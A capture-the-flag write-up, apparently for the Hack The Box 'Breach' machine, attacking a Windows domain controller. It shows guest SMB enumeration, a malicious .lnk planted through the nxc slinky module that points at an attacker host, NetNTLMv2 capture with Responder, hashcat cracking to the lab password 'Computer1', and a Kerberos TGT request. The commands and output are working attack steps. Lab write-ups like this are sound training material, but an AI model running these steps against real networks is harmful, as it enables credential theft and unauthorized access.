<p>As this appears to be a domain controller, I have configured my environment for operation within a Kerberos realm, using standard TTPs, and some tooling I wrote for this purpose</p>
<p><a href="https://github.com/SYANiDE-/tooling">https://github.com/SYANiDE-/tooling</a></p>
<div class="highlight"><pre><span></span><code>- entries in /etc/hosts
    - echo "10.129.38.236 breachdc.breach.vl breach.vl breach breachdc" | sudo tee -a /etc/hosts
- /etc/resolv.conf
    - domain breach.vl
    - nameserver 10.129.38.236
- /etc/krb5.conf
    - sudo make_krb5.conf.py -d breachdc.breach.vl -w
- timesync to the domain controller
    - sudo systemctl start vbox-disable-timesync.service
    - sudo ntpdate -u breachdc
</code></pre></div>
<h2 id="enumeration">enumeration<a class="headerlink" href="#enumeration" title="Permanent link">¶</a></h2>
<p>The guest account is enabled</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb<span class="o">]</span>
└─$<span class="w"> </span>nxc<span class="w"> </span>smb<span class="w"> </span>breachdc.breach.vl<span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s2">""</span>
SMB<span class="w">         </span><span class="m">10</span>.129.38.236<span class="w">   </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2022</span><span class="w"> </span>Build<span class="w"> </span><span class="m">20348</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:BREACHDC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:breach.vl<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB<span class="w">         </span><span class="m">10</span>.129.38.236<span class="w">   </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>breach.vl<span class="se">\g</span>uest:
</code></pre></div>
<p>The guest account has read/write on the <code>share</code> share, and read permissions on the <code>users</code> share.</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb<span class="o">]</span>
└─$<span class="w"> </span>nxc<span class="w"> </span>smb<span class="w"> </span>breachdc.breach.vl<span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s2">""</span><span class="w"> </span>--shares
SMB<span class="w">         </span><span class="m">10</span>.129.38.236<span class="w">   </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span>Server<span class="w"> </span><span class="m">2022</span><span class="w"> </span>Build<span class="w"> </span><span class="m">20348</span><span class="w"> </span>x64<span class="w"> </span><span class="o">(</span>name:BREACHDC<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:breach.vl<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB<span class="w">         </span><span class="m">10</span>.129.38.236<span class="w">   </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>breach.vl<span class="se">\g</span>uest:<span class="w"> </span>
SMB<span class="w">         </span><span class="m">10</span>.129.38.236<span class="w">   </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Enumerated<span class="w"> </span>shares
SMB<span class="w">         </span><span class="m">10</span>.129.38.236<span class="w">   </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>Share<span class="w">           </span>Permissions<span class="w">     </span>Remark
SMB<span class="w">         </span><span class="m">10</span>.129.38.236<span class="w">   </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>-----<span class="w">           </span>-----------<span class="w">     </span>------
SMB<span class="w">         </span><span class="m">10</span>.129.38.236<span class="w">   </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>ADMIN$<span class="w">                          </span>Remote<span class="w"> </span>Admin
SMB<span class="w">         </span><span class="m">10</span>.129.38.236<span class="w">   </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>C$<span class="w">                              </span>Default<span class="w"> </span>share
SMB<span class="w">         </span><span class="m">10</span>.129.38.236<span class="w">   </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>IPC$<span class="w">            </span>READ<span class="w">            </span>Remote<span class="w"> </span>IPC
SMB<span class="w">         </span><span class="m">10</span>.129.38.236<span class="w">   </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>NETLOGON<span class="w">                        </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
SMB<span class="w">         </span><span class="m">10</span>.129.38.236<span class="w">   </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>share<span class="w">           </span>READ,WRITE<span class="w">      </span>
SMB<span class="w">         </span><span class="m">10</span>.129.38.236<span class="w">   </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>SYSVOL<span class="w">                          </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="w"> </span>
SMB<span class="w">         </span><span class="m">10</span>.129.38.236<span class="w">   </span><span class="m">445</span><span class="w">    </span>BREACHDC<span class="w">         </span>Users<span class="w">           </span>READ
</code></pre></div>
<p>In the <code>share</code> share:</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb<span class="o">]</span>
└─$<span class="w"> </span>impacket-smbclient<span class="w"> </span>breach.vl/guest@breachdc.breach.vl<span class="w"> </span>-no-pass

<span class="o">[</span>...<span class="o">]</span>
<span class="c1"># ls</span>
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Sat<span class="w"> </span>Oct<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">00</span>:35:33<span class="w"> </span><span class="m">2025</span><span class="w"> </span>.
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Sep<span class="w">  </span><span class="m">9</span><span class="w"> </span><span class="m">03</span>:35:32<span class="w"> </span><span class="m">2025</span><span class="w"> </span>..
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Thu<span class="w"> </span>Feb<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">03</span>:19:36<span class="w"> </span><span class="m">2022</span><span class="w"> </span>finance
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Thu<span class="w"> </span>Feb<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">03</span>:19:13<span class="w"> </span><span class="m">2022</span><span class="w"> </span>software
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Mon<span class="w"> </span>Sep<span class="w">  </span><span class="m">8</span><span class="w"> </span><span class="m">03</span>:13:44<span class="w"> </span><span class="m">2025</span><span class="w"> </span>transfer
<span class="c1"># cd transfer</span>
<span class="c1"># pwd</span>
/transfer
<span class="c1"># ls</span>
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Mon<span class="w"> </span>Sep<span class="w">  </span><span class="m">8</span><span class="w"> </span><span class="m">03</span>:13:44<span class="w"> </span><span class="m">2025</span><span class="w"> </span>.
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Sat<span class="w"> </span>Oct<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">00</span>:35:33<span class="w"> </span><span class="m">2025</span><span class="w"> </span>..
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Thu<span class="w"> </span>Feb<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">03</span>:23:51<span class="w"> </span><span class="m">2022</span><span class="w"> </span>claire.pope
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Thu<span class="w"> </span>Feb<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">03</span>:23:22<span class="w"> </span><span class="m">2022</span><span class="w"> </span>diana.pope
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Wed<span class="w"> </span>Apr<span class="w"> </span><span class="m">16</span><span class="w"> </span><span class="m">17</span>:38:12<span class="w"> </span><span class="m">2025</span><span class="w"> </span>julia.wong
</code></pre></div>
<p>None of these directories are accessible by <code>guest</code>.  But they are usernames, which might come in handy.</p>
<p>The other folders, <code>finance</code> and <code>software</code> are empty.</p>
<p>These users don't have <code>DONT_REQUIRE_PREAUTH</code> set</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>impacket-GetNPUsers<span class="w"> </span>-dc-host<span class="w"> </span>breachdc.breach.vl<span class="w"> </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span>breach.vl/guest<span class="w"> </span>-no-pass
Impacket<span class="w"> </span>v0.13.0.dev0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies<span class="w"> </span>

<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>claire.pope<span class="w"> </span>doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set</span>
<span class="s1">[-] User diana.pope doesn'</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>julia.wong<span class="w"> </span>doesn<span class="err">'</span>t<span class="w"> </span>have<span class="w"> </span>UF_DONT_REQUIRE_PREAUTH<span class="w"> </span><span class="nb">set</span>
</code></pre></div>
<p>I used the <code>crackmapexec</code> <code>slinky</code> module to place an <code>.ico</code> on the <code>share</code> share, </p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>nxc<span class="w"> </span>smb<span class="w"> </span>breachdc.breach.vl<span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s2">""</span><span class="w"> </span>-M<span class="w"> </span>slinky<span class="w"> </span>-o<span class="w"> </span><span class="nv">SERVER</span><span class="o">=</span><span class="m">10</span>.10.14.204<span class="w"> </span><span class="nv">NAME</span><span class="o">=</span>funtime<span class="w"> </span><span class="nv">ICO_URI</span><span class="o">=</span><span class="se">\\\\</span><span class="m">10</span>.10.14.204<span class="se">\\</span>test<span class="se">\\</span>icon.ico<span class="w"> </span><span class="nv">SHARES</span><span class="o">=</span>share/software<span class="w"> </span><span class="nv">IGNORE</span><span class="o">=</span>c<span class="se">\$</span>,admin<span class="se">\$</span>,netlogon,sysvol,users<span class="w"> </span>--smb-timeout<span class="w"> </span><span class="m">10</span>
</code></pre></div>
<p>downloaded it, then re-uploaded it into all three folders using <code>impacket-smbclient</code>:</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>impacket-smbclient<span class="w"> </span>breach.vl/guest@breachdc.breach.vl<span class="w"> </span>-no-passImpacket<span class="w"> </span>v0.13.0.dev0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies<span class="w"> </span>

Type<span class="w"> </span><span class="nb">help</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>commands
<span class="c1"># ls</span>
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Sat<span class="w"> </span>Oct<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">01</span>:25:14<span class="w"> </span><span class="m">2025</span><span class="w"> </span>.
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Tue<span class="w"> </span>Sep<span class="w">  </span><span class="m">9</span><span class="w"> </span><span class="m">03</span>:35:32<span class="w"> </span><span class="m">2025</span><span class="w"> </span>..
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Sat<span class="w"> </span>Oct<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">01</span>:20:09<span class="w"> </span><span class="m">2025</span><span class="w"> </span>finance
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Sat<span class="w"> </span>Oct<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">01</span>:19:56<span class="w"> </span><span class="m">2025</span><span class="w"> </span>software
drw-rw-rw-<span class="w">          </span><span class="m">0</span><span class="w">  </span>Sat<span class="w"> </span>Oct<span class="w"> </span><span class="m">25</span><span class="w"> </span><span class="m">01</span>:20:34<span class="w"> </span><span class="m">2025</span><span class="w"> </span>transfer
<span class="c1"># use share</span>
<span class="c1"># cd finance</span>
<span class="c1"># put funtime.lnk</span>
<span class="c1"># cd ../software</span>
<span class="c1"># put funtime.lnk</span>
<span class="c1"># cd ../transfer</span>
<span class="c1"># put funtime.lnk</span>
</code></pre></div>
<p>Stood up responder in analyze mode, and eventually I captured an NetNTLMv2-SSP authentication</p>
<div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">2</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>sudo<span class="w"> </span>responder<span class="w"> </span>-I<span class="w"> </span>tun0<span class="w"> </span>-A
<span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>notroot:<span class="w"> </span>
<span class="w">                                         </span>__
<span class="w">  </span>.----.-----.-----.-----.-----.-----.--<span class="p">|</span><span class="w">  </span><span class="p">|</span>.-----.----.
<span class="w">  </span><span class="p">|</span><span class="w">   </span>_<span class="p">|</span><span class="w">  </span>-__<span class="p">|</span>__<span class="w"> </span>--<span class="p">|</span><span class="w">  </span>_<span class="w">  </span><span class="p">|</span><span class="w">  </span>_<span class="w">  </span><span class="p">|</span><span class="w">     </span><span class="p">|</span><span class="w">  </span>_<span class="w">  </span><span class="o">||</span><span class="w">  </span>-__<span class="p">|</span><span class="w">   </span>_<span class="p">|</span>
<span class="w">  </span><span class="p">|</span>__<span class="p">|</span><span class="w"> </span><span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span><span class="w">   </span>__<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
<span class="w">                   </span><span class="p">|</span>__<span class="p">|</span>


<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Poisoners:
<span class="w">    </span>LLMNR<span class="w">                      </span><span class="o">[</span>OFF<span class="o">]</span>
<span class="w">    </span>NBT-NS<span class="w">                     </span><span class="o">[</span>OFF<span class="o">]</span>
<span class="w">    </span>MDNS<span class="w">                       </span><span class="o">[</span>OFF<span class="o">]</span>
<span class="w">    </span>DNS<span class="w">                        </span><span class="o">[</span>ON<span class="o">]</span>
<span class="w">    </span>DHCP<span class="w">                       </span><span class="o">[</span>OFF<span class="o">]</span>

<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Servers:
<span class="w">    </span>HTTP<span class="w"> </span>server<span class="w">                </span><span class="o">[</span>ON<span class="o">]</span>
<span class="w">    </span>HTTPS<span class="w"> </span>server<span class="w">               </span><span class="o">[</span>ON<span class="o">]</span>
<span class="w">    </span>WPAD<span class="w"> </span>proxy<span class="w">                 </span><span class="o">[</span>OFF<span class="o">]</span>
<span class="w">    </span>Auth<span class="w"> </span>proxy<span class="w">                 </span><span class="o">[</span>OFF<span class="o">]</span>
<span class="w">    </span>SMB<span class="w"> </span>server<span class="w">                 </span><span class="o">[</span>ON<span class="o">]</span>
<span class="w">    </span>Kerberos<span class="w"> </span>server<span class="w">            </span><span class="o">[</span>ON<span class="o">]</span>
<span class="w">    </span>SQL<span class="w"> </span>server<span class="w">                 </span><span class="o">[</span>ON<span class="o">]</span>
<span class="w">    </span>FTP<span class="w"> </span>server<span class="w">                 </span><span class="o">[</span>ON<span class="o">]</span>
<span class="w">    </span>IMAP<span class="w"> </span>server<span class="w">                </span><span class="o">[</span>ON<span class="o">]</span>
<span class="w">    </span>POP3<span class="w"> </span>server<span class="w">                </span><span class="o">[</span>ON<span class="o">]</span>
<span class="w">    </span>SMTP<span class="w"> </span>server<span class="w">                </span><span class="o">[</span>ON<span class="o">]</span>
<span class="w">    </span>DNS<span class="w"> </span>server<span class="w">                 </span><span class="o">[</span>ON<span class="o">]</span>
<span class="w">    </span>LDAP<span class="w"> </span>server<span class="w">                </span><span class="o">[</span>ON<span class="o">]</span>
<span class="w">    </span>MQTT<span class="w"> </span>server<span class="w">                </span><span class="o">[</span>ON<span class="o">]</span>
<span class="w">    </span>RDP<span class="w"> </span>server<span class="w">                 </span><span class="o">[</span>ON<span class="o">]</span>
<span class="w">    </span>DCE-RPC<span class="w"> </span>server<span class="w">             </span><span class="o">[</span>ON<span class="o">]</span>
<span class="w">    </span>WinRM<span class="w"> </span>server<span class="w">               </span><span class="o">[</span>ON<span class="o">]</span>
<span class="w">    </span>SNMP<span class="w"> </span>server<span class="w">                </span><span class="o">[</span>ON<span class="o">]</span>

<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>HTTP<span class="w"> </span>Options:
<span class="w">    </span>Always<span class="w"> </span>serving<span class="w"> </span>EXE<span class="w">         </span><span class="o">[</span>OFF<span class="o">]</span>
<span class="w">    </span>Serving<span class="w"> </span>EXE<span class="w">                </span><span class="o">[</span>OFF<span class="o">]</span>
<span class="w">    </span>Serving<span class="w"> </span>HTML<span class="w">               </span><span class="o">[</span>OFF<span class="o">]</span>
<span class="w">    </span>Upstream<span class="w"> </span>Proxy<span class="w">             </span><span class="o">[</span>OFF<span class="o">]</span>

<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Poisoning<span class="w"> </span>Options:
<span class="w">    </span>Analyze<span class="w"> </span>Mode<span class="w">               </span><span class="o">[</span>ON<span class="o">]</span>
<span class="w">    </span>Force<span class="w"> </span>WPAD<span class="w"> </span>auth<span class="w">            </span><span class="o">[</span>OFF<span class="o">]</span>
<span class="w">    </span>Force<span class="w"> </span>Basic<span class="w"> </span>Auth<span class="w">           </span><span class="o">[</span>OFF<span class="o">]</span>
<span class="w">    </span>Force<span class="w"> </span>LM<span class="w"> </span>downgrade<span class="w">         </span><span class="o">[</span>OFF<span class="o">]</span>
<span class="w">    </span>Force<span class="w"> </span>ESS<span class="w"> </span>downgrade<span class="w">        </span><span class="o">[</span>OFF<span class="o">]</span>

<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Generic<span class="w"> </span>Options:
<span class="w">    </span>Responder<span class="w"> </span>NIC<span class="w">              </span><span class="o">[</span>tun0<span class="o">]</span>
<span class="w">    </span>Responder<span class="w"> </span>IP<span class="w">               </span><span class="o">[</span><span class="m">10</span>.10.14.204<span class="o">]</span>
<span class="w">    </span>Responder<span class="w"> </span>IPv6<span class="w">             </span><span class="o">[</span>dead:beef:2::10ca<span class="o">]</span>
<span class="w">    </span>Challenge<span class="w"> </span><span class="nb">set</span><span class="w">              </span><span class="o">[</span>random<span class="o">]</span>
<span class="w">    </span>Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">', '</span>ISATAP.LOCAL<span class="s1">']</span>
<span class="s1">    Don'</span>t<span class="w"> </span>Respond<span class="w"> </span>To<span class="w"> </span>MDNS<span class="w"> </span>TLD<span class="w">  </span><span class="o">[</span><span class="s1">'_DOSVC'</span><span class="o">]</span>
<span class="w">    </span>TTL<span class="w"> </span><span class="k">for</span><span class="w"> </span>poisoned<span class="w"> </span>response<span class="w">  </span><span class="o">[</span>default<span class="o">]</span>

<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Current<span class="w"> </span>Session<span class="w"> </span>Variables:
<span class="w">    </span>Responder<span class="w"> </span>Machine<span class="w"> </span>Name<span class="w">     </span><span class="o">[</span>WIN-DHPV0P7ZJXQ<span class="o">]</span>
<span class="w">    </span>Responder<span class="w"> </span>Domain<span class="w"> </span>Name<span class="w">      </span><span class="o">[</span>SAHT.LOCAL<span class="o">]</span>
<span class="w">    </span>Responder<span class="w"> </span>DCE-RPC<span class="w"> </span>Port<span class="w">     </span><span class="o">[</span><span class="m">47411</span><span class="o">]</span>

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Version:<span class="w"> </span>Responder<span class="w"> </span><span class="m">3</span>.1.7.0
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Author:<span class="w"> </span>Laurent<span class="w"> </span>Gaffie,<span class="w"> </span>&lt;lgaffie@secorizon.com&gt;
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>To<span class="w"> </span>sponsor<span class="w"> </span>Responder:<span class="w"> </span>https://paypal.me/PythonResponder

<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Listening<span class="w"> </span><span class="k">for</span><span class="w"> </span>events...

<span class="o">[</span>Analyze<span class="w"> </span>mode:<span class="w"> </span>ICMP<span class="o">]</span><span class="w"> </span>You<span class="w"> </span>can<span class="w"> </span>ICMP<span class="w"> </span>Redirect<span class="w"> </span>on<span class="w"> </span>this<span class="w"> </span>network.
<span class="o">[</span>Analyze<span class="w"> </span>mode:<span class="w"> </span>ICMP<span class="o">]</span><span class="w"> </span>This<span class="w"> </span>workstation<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.14.204<span class="o">)</span><span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>same<span class="w"> </span>subnet<span class="w"> </span>than<span class="w"> </span>the<span class="w"> </span>DNS<span class="w"> </span>server<span class="w"> </span><span class="o">(</span><span class="m">10</span>.129.38.236<span class="o">)</span>.
<span class="o">[</span>Analyze<span class="w"> </span>mode:<span class="w"> </span>ICMP<span class="o">]</span><span class="w"> </span>Use<span class="w"> </span><span class="sb">`</span>python<span class="w"> </span>tools/Icmp-Redirect.py<span class="sb">`</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>more<span class="w"> </span>details.
<span class="o">[</span>Analyze<span class="w"> </span>mode:<span class="w"> </span>ICMP<span class="o">]</span><span class="w"> </span>You<span class="w"> </span>can<span class="w"> </span>ICMP<span class="w"> </span>Redirect<span class="w"> </span>on<span class="w"> </span>this<span class="w"> </span>network.
<span class="o">[</span>Analyze<span class="w"> </span>mode:<span class="w"> </span>ICMP<span class="o">]</span><span class="w"> </span>This<span class="w"> </span>workstation<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.14.204<span class="o">)</span><span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>same<span class="w"> </span>subnet<span class="w"> </span>than<span class="w"> </span>the<span class="w"> </span>DNS<span class="w"> </span>server<span class="w"> </span><span class="o">(</span><span class="m">192</span>.168.50.1<span class="o">)</span>.
<span class="o">[</span>Analyze<span class="w"> </span>mode:<span class="w"> </span>ICMP<span class="o">]</span><span class="w"> </span>Use<span class="w"> </span><span class="sb">`</span>python<span class="w"> </span>tools/Icmp-Redirect.py<span class="sb">`</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>more<span class="w"> </span>details.
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Responder<span class="w"> </span>is<span class="w"> </span><span class="k">in</span><span class="w"> </span>analyze<span class="w"> </span>mode.<span class="w"> </span>No<span class="w"> </span>NBT-NS,<span class="w"> </span>LLMNR,<span class="w"> </span>MDNS<span class="w"> </span>requests<span class="w"> </span>will<span class="w"> </span>be<span class="w"> </span>poisoned.
<span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Client<span class="w">   </span>:<span class="w"> </span><span class="m">10</span>.129.38.236
<span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Username<span class="w"> </span>:<span class="w"> </span>BREACH<span class="se">\J</span>ulia.Wong
<span class="o">[</span>SMB<span class="o">]</span><span class="w"> </span>NTLMv2-SSP<span class="w"> </span>Hash<span class="w">     </span>:<span class="w"> </span>Julia.Wong::BREACH:b8e16237cccbf32c:374403FAE1D07A04042DB4FBA1642BD5:0101000000000000801EB0A04C45DC0113874E71A609ED8E0000000002000800530041004800540001001E00570049004E002D0044004800500056003000500037005A004A005800510004003400570049004E002D0044004800500056003000500037005A004A00580051002E0053004100480054002E004C004F00430041004C000300140053004100480054002E004C004F00430041004C000500140053004100480054002E004C004F00430041004C0007000800801EB0A04C45DC0106000400020000000800300030000000000000000100000000200000D0EFE4A5B18E1ACF4FD3A7E00E6BC2F32D639EC43CD9B40C9FA69C3E42C199EC0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200300034000000000000000000
</code></pre></div>
<p>I was then able to crack the hash quite easily
</p><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>hashcat<span class="w"> </span>--identify<span class="w"> </span>julia.wong.netntlmv2-ssp<span class="w"> </span>
The<span class="w"> </span>following<span class="w"> </span>hash-mode<span class="w"> </span>match<span class="w"> </span>the<span class="w"> </span>structure<span class="w"> </span>of<span class="w"> </span>your<span class="w"> </span>input<span class="w"> </span>hash:

<span class="w">      </span><span class="c1"># | Name                                                       | Category</span>
<span class="w">  </span><span class="o">======</span>+<span class="o">============================================================</span>+<span class="o">======================================</span>
<span class="w">   </span><span class="m">5600</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>NetNTLMv2<span class="w">                                                  </span><span class="p">|</span><span class="w"> </span>Network<span class="w"> </span>Protocol


┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">5600</span><span class="w"> </span>julia.wong.netntlmv2-ssp<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--force<span class="w"> </span>--quiet
JULIA.WONG::BREACH:b8e16237cccbf32c:374403fae1d07a04042db4fba1642bd5:0101000000000000801eb0a04c45dc0113874e71a609ed8e0000000002000800530041004800540001001e00570049004e002d0044004800500056003000500037005a004a005800510004003400570049004e002d0044004800500056003000500037005a004a00580051002e0053004100480054002e004c004f00430041004c000300140053004100480054002e004c004f00430041004c000500140053004100480054002e004c004f00430041004c0007000800801eb0a04c45dc0106000400020000000800300030000000000000000100000000200000d0efe4a5b18e1acf4fd3a7e00e6bc2f32d639ec43cd9b40c9fa69c3e42c199ec0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200300034000000000000000000:Computer1
</code></pre></div><p></p>
<p>Credential:
</p><div class="highlight"><pre><span></span><code>julia.wong:Computer1
</code></pre></div><p></p>
<p>Get a ccache
</p><div class="highlight"><pre><span></span><code>┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>impacket-getTGT<span class="w"> </span>breach.vl/julia.wong:Computer1
Impacket<span class="w"> </span>v0.13.0.dev0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies<span class="w"> </span>

<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Saving<span class="w"> </span>ticket<span class="w"> </span><span class="k">in</span><span class="w"> </span>julia.wong.ccache

┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>/julia.wong.ccache

┌──<span class="o">(</span>notroot㉿elysium<span class="o">)</span>-<span class="o">[(</span>master<span class="o">)</span><span class="w"> </span><span class="m">1</span><span class="w"> </span>~/htb/machines/breach<span class="o">]</span>
└─$<span class="w"> </span>klist
Ticket<span class="w"> </span>cache:<span class="w"> </span>FILE:/home/notroot/htb/machines/breach/julia.wong.ccache
